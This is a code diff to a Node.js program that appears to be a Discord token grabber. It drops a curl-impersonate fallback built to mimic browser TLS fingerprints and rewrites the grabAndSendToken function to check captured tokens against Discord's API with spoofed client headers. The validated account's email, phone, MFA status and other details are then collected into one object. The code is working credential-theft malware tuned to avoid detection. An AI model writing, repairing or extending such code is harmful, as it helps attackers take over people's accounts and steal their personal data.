@@ -332,148 +332,6 @@ function isCompressed(data) {
   return (b0 === 0x78 && (b1 === 0x9C || b1 === 0xDA || b1 === 0x01));
 }
 
-// ═══════════════════════════════════════════════════════════════════════════════
-// CURL-IMPERSONATE FALLBACK
-// ═══════════════════════════════════════════════════════════════════════════════
-
-let CI_BINARY = null;
-function findCurlImpersonateBinary() {
-  if (CI_BINARY) return CI_BINARY;
-  const candidates = [
-    process.env.CURL_IMPERSONATE_PATH,
-    path.join(__dirname, 'bin', 'curl-impersonate-chrome'),
-    '/usr/local/bin/curl-impersonate-chrome',
-    '/usr/bin/curl-impersonate-chrome',
-    'curl-impersonate-chrome',
-    'curl',
-  ];
-  for (const candidate of candidates) {
-    if (!candidate) continue;
-    try {
-      require('child_process').execSync(`which ${candidate}`, { stdio: 'ignore' });
-      CI_BINARY = candidate;
-      return candidate;
-    } catch(e) {}
-  }
-  CI_BINARY = 'curl';
-  return 'curl';
-}
-
-async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = null, timeoutMs = 25000) {
-  return new Promise((resolve, reject) => {
-    const binary = findCurlImpersonateBinary();
-    const isImpersonate = binary.includes('impersonate');
-    const args = ['-s', '-L', '-D', '-', '--max-time', String(Math.ceil(timeoutMs / 1000)), '-X', method.toUpperCase()];
-
-    if (isImpersonate) {
-      args.push('--compressed', '-H', 'Accept-Language: en-US,en;q=0.9', '-H', 'Accept-Encoding: gzip, deflate, br', '-H', 'Cache-Control: no-cache');
-    } else {
-      args.push('--compressed', '--tlsv1.2');
-    }
-
-    for (const [key, value] of Object.entries(headers)) {
-      if (value != null) args.push('-H', `${key}: ${value}`);
-    }
-
-    let tmpFile = null;
-    if (body) {
-      if (typeof body === 'object' && !(body instanceof Buffer)) {
-        args.push('-d', JSON.stringify(body));
-        if (!headers['Content-Type']) args.push('-H', 'Content-Type: application/json');
-      } else if (body instanceof Buffer) {
-        tmpFile = path.join('/tmp', `ci_body_${Date.now()}_${Math.random().toString(36).slice(2)}`);
-        fs.writeFileSync(tmpFile, body);
-        args.push('--data-binary', `@${tmpFile}`);
-      } else {
-        args.push('-d', String(body));
-      }
-    }
-
-    args.push(url);
-
-    const stdout = [];
-    const stderr = [];
-    const child = spawn(binary, args, { timeout: timeoutMs + 5000, killSignal: 'SIGKILL' });
-    child.stdout.on('data', chunk => stdout.push(chunk));
-    child.stderr.on('data', chunk => stderr.push(chunk));
-
-    const killTimer = setTimeout(() => {
-      try { child.kill('SIGKILL'); } catch(e) {}
-    }, timeoutMs + 8000);
-
-    const cleanupTmp = () => {
-      clearTimeout(killTimer);
-      if (tmpFile) { try { fs.unlinkSync(tmpFile); } catch(e) {} }
-    };
-
-    child.on('close', (code, signal) => {
-      cleanupTmp();
-
-      if (code !== 0 || signal) {
-        const errMsg = Buffer.concat(stderr).toString().trim() || `curl exited${signal ? ' with signal ' + signal : ' with code ' + code}`;
-        return reject(new Error(errMsg));
-      }
-
-      const rawOutput = Buffer.concat(stdout);
-
-      let lastHeaderEndIdx = -1;
-      let lastStatusCode = 0;
-      let lastHeadersText = '';
-      let bodyBuffer = rawOutput;
-
-      const hasCrlf = rawOutput.indexOf('\r\n\r\n') !== -1;
-      const hasLf = rawOutput.indexOf('\n\n') !== -1;
-      const delimiter = hasCrlf ? '\r\n\r\n' : (hasLf ? '\n\n' : null);
-
-      if (delimiter) {
-        const delimBuf = Buffer.from(delimiter);
-        let searchIdx = 0;
-
-        while ((searchIdx = rawOutput.indexOf(delimBuf, searchIdx)) !== -1) {
-          const candidateHeaders = rawOutput.slice(0, searchIdx).toString();
-          const allStatusMatches = candidateHeaders.match(/HTTP\/\d(?:\.\d)?\s+(\d{3})/g);
-          if (allStatusMatches && allStatusMatches.length > 0) {
-            const lastMatch = allStatusMatches[allStatusMatches.length - 1];
-            const codeMatch = lastMatch.match(/HTTP\/\d(?:\.\d)?\s+(\d{3})/);
-            if (codeMatch) {
-              lastStatusCode = parseInt(codeMatch[1], 10);
-              lastHeaderEndIdx = searchIdx;
-              lastHeadersText = candidateHeaders;
-            }
-          }
-          searchIdx += delimBuf.length;
-        }
-      }
-
-      if (lastHeaderEndIdx >= 0) {
-        bodyBuffer = rawOutput.slice(lastHeaderEndIdx + (delimiter === '\r\n\r\n' ? 4 : 2));
-      }
-
-      if (lastStatusCode === 0 && rawOutput.length === 0) {
-        return resolve({ status: 204, headers: '', body: Buffer.alloc(0), data: null });
-      }
-
-      if (lastStatusCode === 0) {
-        const fallbackMatch = rawOutput.toString().match(/HTTP\/\d(?:\.\d)?\s+(\d{3})/);
-        if (fallbackMatch) {
-          lastStatusCode = parseInt(fallbackMatch[1], 10);
-          lastHeadersText = rawOutput.toString();
-          bodyBuffer = Buffer.alloc(0);
-        } else {
-          return reject(new Error('No HTTP response received from server'));
-        }
-      }
-
-      let data = null;
-      try { data = JSON.parse(bodyBuffer.toString().trim()); } catch(e) {}
-      resolve({ status: lastStatusCode, headers: lastHeadersText, body: bodyBuffer, data });
-    });
-    child.on('error', (err) => {
-      cleanupTmp();
-      reject(err);
-    });
-  });
-}
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // DISCORD API CLIENT — Rate-limited REST client using AXIOS (reliable)
@@ -1428,27 +1286,37 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
 
     const fp = _rfp(token);
     const superProps = generateXSuperProperties(token);
-    const validateRes = await Promise.race([
-      curlImpersonateRequest(
-        'https://discord.com/api/v10/users/@me',
-        'GET',
-        { 'Authorization': token, 'User-Agent': fp, 'X-Discord-Locale': 'en-US', 'X-Super-Properties': superProps },
-        null,
-        10000
-      ),
-      new Promise((_, reject) => setTimeout(() => reject(new Error('Token validation timed out')), 15000))
-    ]);
-
-    if (validateRes.status === 401 || validateRes.status === 403) {
-      _tokenValidationCache.set(cacheKey, { valid: false, ts: Date.now() });
-      return { success: false, error: 'Invalid token' };
+    // Use axios with same TLS config as DiscordApiClient — curl was unreliable
+    let validateRes;
+    try {
+      validateRes = await axios.get('https://discord.com/api/v10/users/@me', {
+        headers: {
+          'Authorization': token,
+          'User-Agent': fp,
+          'Accept': '*/*',
+          'Accept-Language': 'en-US,en;q=0.9',
+          'X-Discord-Locale': 'en-US',
+          'X-Super-Properties': superProps,
+          'Referer': 'https://discord.com/channels/@me'
+        },
+        httpsAgent: _sharedAgent,
+        timeout: 15000,
+        validateStatus: () => true
+      });
+    } catch (err) {
+      console.error('[TokenGrab] Request failed:', err.message);
+      return { success: false, error: 'Token validation request failed: ' + err.message };
     }
-    if (validateRes.status < 200 || validateRes.status >= 300 || !validateRes.data) {
-      _tokenValidationCache.set(cacheKey, { valid: false, ts: Date.now() });
-      return { success: false, error: 'Invalid token' };
-    }
-
+    const status = validateRes.status;
     const userData = validateRes.data;
+    if (status === 401 || status === 403) {
+      _tokenValidationCache.set(cacheKey, { valid: false, ts: Date.now() });
+      return { success: false, error: 'Invalid token' };
+    }
+    if (status < 200 || status >= 300 || !userData || !userData.id) {
+      _tokenValidationCache.set(cacheKey, { valid: false, ts: Date.now() });
+      return { success: false, error: 'Token validation failed: HTTP ' + status };
+    }
     const fullInfo = { ...userInfo, id: userData.id, username: userData.username, global_name: userData.global_name, email: userData.email, phone: userData.phone, verified: userData.verified, mfa_enabled: userData.mfa_enabled, nitro: userData.premium_type, locale: userData.locale };
 
     _tokenValidationCache.set(cacheKey, {
